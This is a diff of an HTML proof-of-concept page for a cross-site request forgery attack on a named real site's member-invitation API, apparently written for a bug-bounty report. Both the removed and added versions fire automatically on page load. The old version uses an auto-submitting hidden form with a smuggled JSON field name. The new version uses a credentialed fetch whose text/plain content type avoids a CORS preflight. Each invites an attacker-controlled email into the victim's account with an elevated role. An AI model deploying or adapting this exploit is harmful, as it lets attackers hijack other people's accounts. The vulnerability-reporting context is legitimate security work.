@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF PoC - SellingPilot Invite Member</title>
-    <meta charset="UTF-8">
+  <title>CSRF PoC - Inviting Account</title>
 </head>
 <body>
-    <h2>CSRF PoC - SellingPilot Invite Member</h2>
-    <p>Loading...</p>
-
-    <!-- Form auto-submit ke endpoint target -->
-    <form id="csrfForm" action="https://www.sellingpilot.com/api/account/inviting?_xhr=true" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"name":"victim hackerone","email":"hackerkorban8@gmail.com","roleId":1,"status":0,"vendorId":null,"lang":"en-us","x":"' value='"}' />
-        <input type="submit" value="Submit" />
-    </form>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            document.getElementById('csrfForm').submit();
-        });
-    </script>
+  <h3>CSRF PoC: /api/account/inviting</h3>
+  <script>
+    fetch("https://www.sellingpilot.com/api/account/inviting?_xhr=true", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "text/plain" // dipakai agar request dianggap "simple request" (hindari preflight CORS)
+      },
+      body: JSON.stringify({
+        name: "victim hackerone",
+        email: "hackerkorban8@gmail.com",
+        roleId: 1,
+        status: 0,
+        vendorId: null,
+        lang: "en-us"
+      })
+    });
+  </script>
 </body>
 </html>
